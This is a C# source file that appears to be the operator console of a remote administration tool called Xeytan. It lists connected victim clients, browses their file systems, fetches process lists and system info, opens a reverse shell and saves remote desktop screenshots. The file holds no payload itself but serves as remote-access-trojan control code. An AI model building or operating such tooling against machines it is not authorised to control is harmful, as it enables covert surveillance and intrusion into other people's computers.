using NetLib.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using XeytanCSharpServer.Models;
using XeytanCSharpServer.Ui.Console.Views;
using C = System.Console;
using FileInfo = NetLib.Models.FileInfo;

namespace XeytanCSharpServer.Ui.Console
{
    class ConsoleUiMediator
    {
        public XeytanApplication Application { get; set; }
        private MainView MainView { get; set; }
        private FileSystemView FileSystemView { get; set; }
        private IView CurrentView { get; set; }
        private Client Client { get; set; }
        private ReaderWriterLock ClientLock { get; }
        private ReaderWriterLock RevShellLock { get; }
        public bool Running { get; set; }
        public bool IsRevShellActive { get; set; } = false;
        public bool IsDesktopActive { get; set; } = false;
        public object IsDesktopActiveLock { get; set; } = new object();

        public ConsoleUiMediator()
        {
            FileSystemView = new FileSystemView();
            MainView = new MainView();
            CurrentView = MainView;
            ClientLock = new ReaderWriterLock();
            RevShellLock = new ReaderWriterLock();
        }

        public void Loop()
        {
            Running = true;
            C.CancelKeyPress += new ConsoleCancelEventHandler(C_CancelKeyPress);
            while (Running)
            {
                string instruction = CurrentView.Loop();
                if (instruction == null) continue;
                if (!ProcessInstruction(instruction))
                {
                    C.WriteLine("Could not handle {0}", instruction);
                }
            }
        }

        private void C_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            if (CurrentView != MainView || Client != null)
            {
                CurrentView = MainView;
                SetActiveClient(null);
                C.WriteLine();
            }
            else
            {
                C.WriteLine();
                C.WriteLine("If you want to exit the application enter exit");
            }

            Loop();
        }

        private bool ProcessInstruction(string instruction)
        {
            string[] parts = instruction.Split();

            if (parts.Length == 1 && string.IsNullOrEmpty(parts[0]))
                return true;

            if (!HandleInstruction(parts))
            {
                if (Client == null)
                {
                    return ProcessInstructionNotInteracting(parts);
                }
                else
                {
                    return ProcessInstructionInteracting(instruction, parts);
                }
            }

            return false;
        }

        private bool HandleInstruction(string[] parts)
        {
            if (IsRevShellActive)
                return false;

            if (parts[0].Equals("exit", StringComparison.OrdinalIgnoreCase) ||
                parts[0].Equals("quit", StringComparison.OrdinalIgnoreCase))
                Environment.Exit(0);
            return false;
        }

        private bool ProcessInstructionNotInteracting(string[] parts)
        {
            if (parts[0] == "ls")
            {
                List<Client> clients = Application.GetClients();
                MainView.ListSessions(clients);
                return true;
            }

            if (parts.Length > 1 &&
                parts[0].Equals("interact", StringComparison.OrdinalIgnoreCase))
            {
                SetActiveClient(int.Parse(parts[1]));
                return true;
            }

            return false;
        }

        private bool ProcessInstructionInteracting(string instruction, string[] parts)
        {
            try
            {
                ClientLock.AcquireReaderLock(15 * 1000);

                try
                {
                    RevShellLock.AcquireReaderLock(15 * 1000);
                    if (IsRevShellActive)
                    {
                        Application.ExecInShell(Client, instruction);
                        return true;
                    }
                }
                catch (ApplicationException)
                {
                    C.WriteLine("DeadLock ? ProcessInstructionInteracting");
                }
                finally
                {
                    RevShellLock.ReleaseReaderLock();
                }

                if (parts[0] == "ls")
                {
                    if (CurrentView == FileSystemView)
                    {
                        string basePath = FileSystemView.CurrentBasePath;
                        if (basePath == null)
                            Application.FetchFileSystemDrives(Client);
                        else
                            Application.FetchDirEntries(Client, basePath);
                    }
                    else
                    {
                        if (parts.Length == 1 || (parts.Length > 1 && parts[1].Trim().Equals("/")))
                        {
                            Application.FetchFileSystemDrives(Client);
                        }
                        else
                        {
                            string basePath = Path.GetFullPath(parts[1]);
                            Application.FetchDirEntries(Client, basePath);
                        }
                    }

                    return true;
                }

                if (parts[0].Equals("sysinfo", StringComparison.OrdinalIgnoreCase))
                {
                    Application.FetchSystemInfo(Client);
                    return true;
                }

                if (parts[0] == "fs")
                {
                    if (parts.Length == 1 ||
                        (parts.Length > 1 && parts[1].Equals("start", StringComparison.OrdinalIgnoreCase)))
                    {
                        CurrentView = FileSystemView;
                        FileSystemView.SetActiveClient(Application.GetClient(Client.Id));
                    }
                }
                else if (parts[0] == "ps")
                {
                    Application.FetchProcessList(Client);
                    return true;
                }
                else if (instruction.Equals("desktop start", StringComparison.OrdinalIgnoreCase))
                {
                    bool shouldStart;

                    lock (IsDesktopActiveLock)
                    {
                        shouldStart = !IsDesktopActive;
                    }

                    if (shouldStart)
                        Application.StartDesktop(Client);

                    return true;
                }
                else if (instruction.Equals("desktop stop", StringComparison.OrdinalIgnoreCase))
                {
                    lock (IsDesktopActiveLock)
                    {
                        if (IsDesktopActive)
                        {
                            IsDesktopActive = false;
                            Application.StopDesktop(Client);
                        }
                    }

                    return true;
                }
                else if (parts[0] == "cd")
                {
                    if (parts.Length > 1)
                    {
                        if (CurrentView != FileSystemView)
                        {
                            CurrentView = FileSystemView;
                            FileSystemView.ChangeDirectory(parts[1]);
                            FileSystemView.Client = Client;
                        }
                    }
                }
                else if (parts[0] == "shell")
                {
                    try
                    {
                        RevShellLock.AcquireWriterLock(15 * 1000);
                        IsRevShellActive = true;
                    }
                    catch (ApplicationException)
                    {
                        C.WriteLine("DeadLock? RevShellLock.AcquireWriterLock");
                    }
                    finally
                    {
                        RevShellLock.ReleaseWriterLock();
                    }

                    Application.StartShell(Client);

                    return true;
                }
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::ProcessInstructionInteracting AcquireReaderLock");
                C.WriteLine("============================================================================");
                return false;
            }
            finally
            {
                ClientLock.ReleaseReaderLock();
            }

            return false;
        }


        public void ShowClientConnection(Client client)
        {
            MainView.ShowClientConnection(client);

// Speed up testing
            SetActiveClient(client);
            CurrentView.PrintBanner();
        }

        private void SetActiveClient(int clientId)
        {
            try
            {
                ClientLock.AcquireWriterLock(15 * 1000);
                Client = Application.GetClient(clientId);
                SetActiveClient(Client);
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::SetActiveClient(int) AcquireWriterLock");
                C.WriteLine("============================================================================");
            }
            finally
            {
                ClientLock.ReleaseWriterLock();
            }
        }

        private void SetActiveClient(Client client)
        {
            try
            {
                ClientLock.AcquireWriterLock(15 * 1000);
                Client = client;
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::SetActiveClient(Client) AcquireWriterLock");
                C.WriteLine("============================================================================");
                return;
            }
            finally
            {
                ClientLock.ReleaseWriterLock();
            }

            if (CurrentView.GetType() == typeof(IClientView))
                ((IClientView) CurrentView).SetActiveClient(Client);

            // MainView also takes care of client interaction
            if (CurrentView == MainView)
                MainView.SetActiveClient(Client);
        }

        public void OnClientDisconnected(Client client)
        {
            try
            {
                ClientLock.AcquireWriterLock(15 * 1000);

                if (Client == client)
                {
                    Client = null;
                    if (CurrentView.GetType() == typeof(IClientView))
                    {
                        ((IClientView) CurrentView).SetActiveClient(null);
                        CurrentView = MainView;
                        C.WriteLine("Current interacting user has disconnected");
                        CurrentView.PrintBanner();
                    }

                    try
                    {
                        RevShellLock.AcquireWriterLock(15 * 1000);
                        IsRevShellActive = false;
                    }
                    catch (ApplicationException exception)
                    {
                        C.WriteLine("============================================================================");
                        C.WriteLine("DeadLock? ConsoleUiMediator::OnClientDisconnected(Client) AcquireWriterLock");
                        C.WriteLine("============================================================================");
                    }
                    finally
                    {
                        RevShellLock.ReleaseWriterLock();
                    }
                }
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::OnClientDisconnected(Client) AcquireWriterLock");
                C.WriteLine("============================================================================");
            }

            finally
            {
                ClientLock.ReleaseWriterLock();
            }
        }

//=====================================================================================
// Triggered From Application class
//=====================================================================================

        public void ShowFsRoots(Client client, List<DiskDriveInfo> drives)
        {
            FileSystemView.PrintRoots(client, drives);
            CurrentView.PrintBanner();
        }

        public void ShowFsDirEntries(Client client, string basePath, List<FileInfo> dirEntries)
        {
            FileSystemView.PrintFsDirEntries(client, basePath, dirEntries);
            CurrentView.PrintBanner();
        }

        public void ShowProcessList(Client client, List<ProcessInfo> processes)
        {
            ProcessView.PrintProcesses(client, processes);
            CurrentView.PrintBanner();
        }

        public void ShowSystemInformation(Client client, SystemInfo systemInformation)
        {
            SystemInfoView.PrintSystemInfo(client, systemInformation);
            CurrentView.PrintBanner();
        }

        public void ShowShellOutput(Client client, string output)
        {
            C.Write(output);
        }

        public void StopShell(Client client)
        {
            try
            {
                RevShellLock.AcquireReaderLock(15 * 1000);
                if (IsRevShellActive && Client == client)
                {
                    RevShellLock.UpgradeToWriterLock(15 * 1000);
                    IsRevShellActive = false;
                    C.WriteLine();
                    C.WriteLine("[+] Stopping Shell for Client {0}", client.PcName);
                    CurrentView.PrintBanner();
                }
            }
            catch (ApplicationException exception)
            {
                C.WriteLine("============================================================================");
                C.WriteLine("DeadLock? ConsoleUiMediator::StopShell(Client)");
                C.WriteLine("============================================================================");
            }
            finally
            {
                RevShellLock.ReleaseWriterLock();
            }
        }

        public void OnDesktopImageReceived(Client client, byte[] imageData)
        {
            string path = Directory.GetCurrentDirectory() + Path.DirectorySeparatorChar + client.PcName;
            if (!IsDesktopActive && Client == client)
            {
                IsDesktopActive = true;

                if (!Directory.Exists(path))
                    Directory.CreateDirectory(path);

                C.WriteLine("[+] Desktop image received, Images will be saved in {0}", path);
            }

            File.WriteAllBytes(path + Path.DirectorySeparatorChar + "screenshot.png", imageData);
        }

        public void OnDesktopStreamClosed(Client client)
        {
            lock (IsDesktopActiveLock)
            {
                if (IsDesktopActive && Client == client)
                {
                    C.WriteLine("Desktop session closed");
                    IsDesktopActive = false;
                }
            }
        }
    }
}